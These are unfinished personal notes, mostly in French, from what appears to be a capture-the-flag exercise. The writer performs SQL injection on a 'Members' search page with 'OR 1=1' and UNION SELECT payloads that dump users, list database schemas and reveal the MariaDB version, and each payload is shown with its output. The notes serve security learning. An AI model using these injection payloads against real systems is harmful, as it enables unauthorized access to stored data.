

## A refaire, pas fini
- Sur la page de recherche de Members si on met "1 OR 1=1" on recois une liste des users
dans laquelle on voit un user avec Fist name: Flag et Surname: GetThe

- Ensuite j'ai teste "1 OR user_id=5 AND first_name IS NOT NULL "
ID: 1 OR user_id=5 AND first_name IS NOT NULL 
First name: Flag
Surname : GetThe



- 1 OR 1=1 UNION SELECT 1,2-- if that works without error, then the query likely has two columns.

- ou can attempt to retrieve the names of the databases using: 1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA--

ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: one
Surname : me
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: two
Surname : me
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: three
Surname : me
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: Flag
Surname : GetThe
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: 2
Surname : information_schema
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: 2
Surname : Member_Brute_Force
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: 2
Surname : Member_Sql_Injection
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: 2
Surname : Member_guestbook
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: 2
Surname : Member_images
ID:  1 OR 1=1 UNION SELECT 2,SCHEMA_NAME FROM information_schema.SCHEMATA-- 
First name: 2
Surname : Member_survey



- 1 OR 1=1 UNION SELECT 1, (SELECT @@version)-- 
on recois ca

...
ID: 1 OR 1=1 UNION SELECT 1, (SELECT @@version)-- 
First name: Flag
Surname : GetThe

ID: 1 OR 1=1 UNION SELECT 1, (SELECT @@version)-- 
First name: 1
Surname : 5.5.64-MariaDB-1ubuntu0.14.04.1
